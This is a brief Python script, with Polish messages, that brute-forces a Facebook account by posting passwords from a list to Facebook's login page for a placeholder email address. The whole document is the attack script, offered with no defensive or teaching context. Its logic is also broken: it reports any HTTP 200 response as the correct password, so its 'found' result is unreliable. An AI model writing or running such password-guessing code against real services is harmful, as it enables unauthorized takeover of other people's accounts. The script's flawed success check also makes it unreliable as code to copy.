import requests
import time

def brute_force(username, password):
    url = "https://www.facebook.com/login.php"
    payload = {
        "email": username,
        "password": password,
        "login": "Log In"
    }
    response = requests.post(url, data=payload)

    if response.status_code != 200:
        print("Błąd podczas logowania. Kod odpowiedzi:", response.status_code)
        return False

    print("Znaleziono hasło:", password)
    return True

def main():
    username = "example@example.com"
    password_list = ["hasło1", "hasło2", "hasło3", ...]

    for password in password_list:
        if brute_force(username, password):
            break

    else:
        print("Nie znaleziono hasła.")

if __name__ == "__main__":
    main()

